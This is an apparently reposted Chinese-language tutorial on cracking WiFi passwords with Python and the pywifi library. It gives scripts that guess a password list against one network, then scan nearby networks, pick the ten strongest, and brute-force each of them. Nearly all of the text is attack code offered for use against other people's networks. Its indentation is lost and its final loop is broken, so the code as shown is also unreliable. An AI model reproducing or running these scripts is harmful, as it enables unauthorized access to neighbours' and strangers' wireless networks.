# [Python] （文末必看）
# #-*- coding: UTF-8 -*-
# import pywifi
# from pywifi import const #引用一些定義
# profile = pywifi.Profile() #創建wifi連接文件
# profile.ssid = '*****' #定義wifissid
# profile.auth = const.AUTH_ALG_OPEN #網卡的開放
# profile.akm.append(const.AKM_TYPE_WPA2PSK) #wifi加密算法
# profile.cipher = const.CIPHER_TYPE_CCMP #加密單元
# profile.key = '*****' #wifi密碼
# wifi = pywifi.PyWiFi() #抓取網卡接口
# iface = wifi.interfaces()[0] #獲取網卡
# profile = iface.add_network_profile(profile) #加載配置文件
# iface.connect(profile) #連接wifi


# 原文網址：https://kknews.cc/code/op26bz5.html
  
  

  
  0x02 WIFI破解
一、對單一的目標破解
也許沒表達對，我的意思呢，就是只對一個目標進行破解........
[Python]
#-*- coding: UTF-8 -*-
import pywifi
from pywifi import const #引用一些定義
import time
def testwifi(password):
wifi=pywifi.PyWiFi()#抓取網卡接口
ifaces=wifi.interfaces()[0]#獲取網卡
ifaces.disconnect()#斷開無限網卡連接
profile=pywifi.Profile()#創建wifi連接文件
profile.ssid="*******"#定義wifissid
profile.auth=const.AUTH_ALG_OPEN#網卡的開放
profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
profile.cipher=const.CIPHER_TYPE_CCMP##加密單元
profile.key=password #wifi密碼
ifaces.remove_all_network_profiles()#刪除其他所有配置文件
tmp_profile=ifaces.add_network_profile(profile)#加載配置文件
ifaces.connect(tmp_profile)#連接wifi
time.sleep(5)#5秒內能否連接上
if ifaces.status()==const.IFACE_CONNECTED:
print "[-]WiFi connection success!"
else:
print "[-]WiFi connection failure!"
ifaces.disconnect()#斷開連接
time.sleep(1)
return True
def main():
print " ____ _ __ _____ _____ ___ "
print " / ___|_ __ __ _ ___| | _\ \ / /_ _| ___|_ _|"
print "| | | '__/ _` |/ __| |/ /\ \ /\ / / | || |_ | | "
print "| |___| | | (_| | (__| < \ V V / | || _| | | "
print " \____|_| \__,_|\___|_|\_\ \_/\_/ |___|_| |___|"
path=r"password.txt"
files=open(path,'r')
while True:
f=files.readline()
if not f:
break
f = f[:-1]
testwifi(f)
print "[-]Current password:",f
files.close()
if __name__ == '__main__':
main()


原文網址：https://kknews.cc/code/op26bz5.html
  
  
  
  
  
  [Python]
#-*- coding: UTF-8 -*-
import pywifi
from pywifi import const #引用一些定義
def getwifi():
wifi=pywifi.PyWiFi()#抓取網卡接口
ifaces=wifi.interfaces()[0]#獲取網卡
ifaces.scan()
bessis = ifaces.scan_results()
list = []
for data in bessis:
list.append((data.ssid, data.signal))
return len(list), sorted(list, key=lambda st: st[1], reverse=True)
if __name__ == '__main__':
print getwifi()
然後是通過信號強度實現排序，進入top10會進行後續的破解工作...
[Python]
#-*- coding: UTF-8 -*-
import pywifi
from pywifi import const #引用一些定義
import time
def getwifi():
wifi=pywifi.PyWiFi()#抓取網卡接口
ifaces=wifi.interfaces()[0]#獲取網卡
ifaces.scan()
bessis = ifaces.scan_results()
list = []
for data in bessis:
list.append((data.ssid, data.signal))
return len(list), sorted(list, key=lambda st: st[1], reverse=True)
def getsignal():
while True:
n, data = getwifi()
time.sleep(1)
if n is not 0:
return data[0:10]
if __name__ == '__main__':
print getsignal()
排完序之後，就是把信號強度去掉，然後獲取ssidname
[Python]
#-*- coding: UTF-8 -*-
import pywifi
from pywifi import const #引用一些定義
import time
def getwifi():
wifi=pywifi.PyWiFi()#抓取網卡接口
ifaces=wifi.interfaces()[0]#獲取網卡
ifaces.scan()
bessis = ifaces.scan_results()
list = []
for data in bessis:
list.append((data.ssid, data.signal))
return len(list), sorted(list, key=lambda st: st[1], reverse=True)
def getsignal():
while True:
n, data = getwifi()
time.sleep(1)
if n is not 0:
return data[0:10]
def ssidnamelist():
ssidlist = getsignal()
namelist = []
for item in ssidlist:
namelist.append(item[0])
return namelist
if __name__ == '__main__':
print ssidnamelist()
之後，就是上面對單個wifi破解的套路了，只需稍微改一下，直接貼代碼了
[Python] 純文本查看 複製代碼
#-*- coding: UTF-8 -*-
import pywifi
from pywifi import const #引用一些定義
import time
def getwifi():
wifi=pywifi.PyWiFi()#抓取網卡接口
ifaces=wifi.interfaces()[0]#獲取網卡
ifaces.scan()
bessis = ifaces.scan_results()
list = []
for data in bessis:
list.append((data.ssid, data.signal))
return len(list), sorted(list, key=lambda st: st[1], reverse=True)
def getsignal():
while True:
n, data = getwifi()
time.sleep(1)
if n is not 0:
return data[0:10]
def ssidnamelist():
ssidlist = getsignal()
namelist = []
for item in ssidlist:
namelist.append(item[0])
return namelist
def testwifi(ssidname,password):
wifi=pywifi.PyWiFi()#抓取網卡接口
ifaces=wifi.interfaces()[0]#獲取網卡
ifaces.disconnect()#斷開無限網卡連接
profile=pywifi.Profile()#創建wifi連接文件
profile.ssid=ssidname#定義wifissid
profile.auth=const.AUTH_ALG_OPEN#網卡的開放
profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
profile.cipher=const.CIPHER_TYPE_CCMP##加密單元
profile.key=password #wifi密碼
ifaces.remove_all_network_profiles()#刪除其他所有配置文件
tmp_profile=ifaces.add_network_profile(profile)#加載配置文件
ifaces.connect(tmp_profile)#連接wifi
time.sleep(5)#5秒內能否連接上
if ifaces.status()==const.IFACE_CONNECTED:
print "[-]WiFi connection success!"
else:
print "[-]WiFi connection failure!"
ifaces.disconnect()#斷開連接
time.sleep(1)
return True
def main():
print " ____ _ __ _____ _____ ___ "
print " / ___|_ __ __ _ ___| | _\ \ / /_ _| ___|_ _|"
print "| | | '__/ _` |/ __| |/ /\ \ /\ / / | || |_ | | "
print "| |___| | | (_| | (__| < \ V V / | || _| | | "
print " \____|_| \__,_|\___|_|\_\ \_/\_/ |___|_| |___|"
path=r"password.txt"
files=open(path,'r')
while True:
f=files.readline()
for ssidname in ssidnamelist():
ret=testwifi(ssidname,f)
print 'Current WIFIname:',ssidname
print 'Current password:',f
files.close()
if __name__ == '__main__':
main()


原文網址：https://kknews.cc/code/op26bz5.html
  
